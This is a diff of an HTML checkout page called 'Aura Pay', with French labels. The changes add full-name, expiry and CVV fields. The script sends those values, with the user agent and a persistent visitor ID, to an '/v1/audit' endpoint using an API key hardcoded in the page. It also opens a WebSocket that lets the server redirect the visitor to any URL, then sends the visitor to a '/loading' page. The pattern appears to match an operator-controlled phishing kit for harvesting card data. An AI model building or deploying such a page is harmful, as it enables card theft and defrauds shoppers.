@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aura Pay - Paiement Sécurisé</title>
+    <title>Checkout - Aura Pay</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -16,14 +16,14 @@
 
         body {
             margin: 0;
-            padding: 0;
             font-family: 'Inter', sans-serif;
             background: radial-gradient(circle at top right, #1e1b4b, var(--bg));
             color: var(--text);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
+            padding: 20px;
         }
 
         .glass-card {
@@ -33,7 +33,7 @@
             padding: 2.5rem;
             border-radius: 24px;
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
 
@@ -44,37 +44,37 @@
         }
 
         .input-group {
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.2rem;
         }
 
         label {
             display: block;
             margin-bottom: 0.5rem;
-            font-size: 0.875rem;
+            font-size: 0.8rem;
             color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         input {
             width: 100%;
-            padding: 0.75rem;
-            background: rgba(0, 0, 0, 0.2);
+            padding: 0.8rem;
+            background: rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
             color: white;
             font-size: 1rem;
-            transition: all 0.3s;
             box-sizing: border-box;
         }
 
         input:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
         }
 
         .row {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: 2fr 1fr;
             gap: 1rem;
         }
 
@@ -86,9 +86,8 @@
             border-radius: 12px;
             color: white;
             font-weight: 600;
-            font-size: 1rem;
             cursor: pointer;
-            transition: transform 0.2s, background 0.3s;
+            transition: 0.3s;
             margin-top: 1rem;
         }
 
@@ -97,44 +96,11 @@
             transform: translateY(-2px);
         }
 
-        button:active {
-            transform: translateY(0);
-        }
-
         #status {
             text-align: center;
-            margin-top: 1.5rem;
-            font-size: 0.875rem;
-            min-height: 1.25rem;
-        }
-
-        .success {
-            color: #10b981;
-        }
-
-        .error {
+            margin-top: 1rem;
+            font-size: 0.9rem;
             color: #ef4444;
-        }
-
-        .loader {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #fff;
-            border-bottom-color: transparent;
-            border-radius: 50%;
-            margin: 0 auto;
-            animation: rotation 1s linear infinite;
-        }
-
-        @keyframes rotation {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
         }
     </style>
 </head>
@@ -142,87 +108,83 @@
 <body>
     <div class="glass-card">
         <h2>Aura Pay</h2>
-        <form id="paymentForm">
+        <form id="payForm">
             <div class="input-group">
-                <label>Email</label>
-                <input type="email" id="email" placeholder="client@example.com" required>
+                <label>Nom complet</label>
+                <input type="text" id="name" placeholder="Jean Dupont" required>
             </div>
             <div class="input-group">
-                <label>Numéro de Carte</label>
-                <input type="text" id="card" placeholder="4242-4242-4242-4242" required>
+                <label>Email</label>
+                <input type="email" id="email" placeholder="jean@example.com" required>
+            </div>
+            <div class="input-group">
+                <label>Numéro de carte</label>
+                <input type="text" id="card" placeholder="4242 4242 4242 4242" required maxlength="19">
             </div>
             <div class="row">
                 <div class="input-group">
-                    <label>Expiration</label>
-                    <input type="text" id="expiry" placeholder="MM/YY" required>
+                    <label>Expiration (MM/YY)</label>
+                    <input type="text" id="expiry" placeholder="12/26" required maxlength="5">
                 </div>
                 <div class="input-group">
-                    <label>Montant (€)</label>
-                    <input type="number" id="amount" placeholder="100.00" step="0.01" required>
+                    <label>CVV</label>
+                    <input type="text" id="cvv" placeholder="123" required maxlength="4">
                 </div>
             </div>
-            <button type="submit" id="submitBtn">
-                <span id="btnText">Payer Maintenant</span>
-                <div class="loader" id="loader"></div>
-            </button>
+            <div class="input-group">
+                <label>Montant (€)</label>
+                <input type="number" id="amount" value="100.00" step="0.01" required>
+            </div>
+            <button type="submit">Payer Maintenant</button>
         </form>
         <div id="status"></div>
     </div>
 
     <script>
-        const form = document.getElementById('paymentForm');
-        const status = document.getElementById('status');
-        const loader = document.getElementById('loader');
-        const btnText = document.getElementById('btnText');
-        const submitBtn = document.getElementById('submitBtn');
+        // Session ID permanent pour ce visiteur
+        let clientId = localStorage.getItem('aura_client_id');
+        if (!clientId) {
+            clientId = 'cl-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('aura_client_id', clientId);
+        }
 
+        // Connexion WebSocket pour redirection instantanée
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const ws = new WebSocket(`${protocol}//${window.location.host}/ws/client/${clientId}`);
+        ws.onmessage = (e) => {
+            const msg = JSON.parse(e.data);
+            if (msg.type === 'REDIRECT') window.location.href = msg.url;
+        };
+
+        const form = document.getElementById('payForm');
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-
-            status.textContent = '';
-            btnText.style.display = 'none';
-            loader.style.display = 'block';
-            submitBtn.disabled = true;
-
-            const cardValue = document.getElementById('card').value.replace(/\s+/g, '').replace(/-/g, '');
-            const maskedCard = cardValue.length >= 16
-                ? `${cardValue.substring(0, 4)}-****-****-${cardValue.substring(12, 16)}`
-                : cardValue;
+            const btn = form.querySelector('button');
+            btn.disabled = true;
+            btn.textContent = 'Traitement...';
 
             const data = {
+                client_id: clientId,
                 email: document.getElementById('email').value,
+                full_name: document.getElementById('name').value,
+                numero_carte_masque: document.getElementById('card').value.replace(/\s/g, '').replace(/(\d{4})\d+(\d{4})/, "$1-****-****-$2"),
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
                 montant: parseFloat(document.getElementById('amount').value),
-                numero_carte_masque: maskedCard,
-                adresse_ip: "123.123.123.123" // Simulé pour la démo
+                adresse_ip: "123.123.123.123", // Simulé
+                device: navigator.userAgent
             };
 
             try {
-                const response = await fetch('/v1/audit', {
+                const res = await fetch('/v1/audit', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-API-KEY': 'pro-audit-secret-key-2024'
-                    },
+                    headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'pro-audit-secret-key-2024' },
                     body: JSON.stringify(data)
                 });
-
-                const result = await response.json();
-
-                if (response.ok) {
-                    status.innerHTML = `<span class="success">Paiement validé ! Statut: ${result.status}</span>`;
-                } else {
-                    // Affichage propre des erreurs de validation Pydantic
-                    const errorMsg = result.detail && typeof result.detail === 'object'
-                        ? result.detail[0].msg
-                        : (result.detail || 'Erreur inconnue');
-                    status.innerHTML = `<span class="error">Erreur: ${errorMsg}</span>`;
-                }
+                if (res.ok) window.location.href = '/loading';
+                else document.getElementById('status').textContent = "Erreur de validation.";
             } catch (err) {
-                status.innerHTML = `<span class="error">Erreur réseau: ${err.message}</span>`;
-            } finally {
-                btnText.style.display = 'block';
-                loader.style.display = 'none';
-                submitBtn.disabled = false;
+                document.getElementById('status').textContent = "Erreur de connexion.";
             }
         });
     </script>
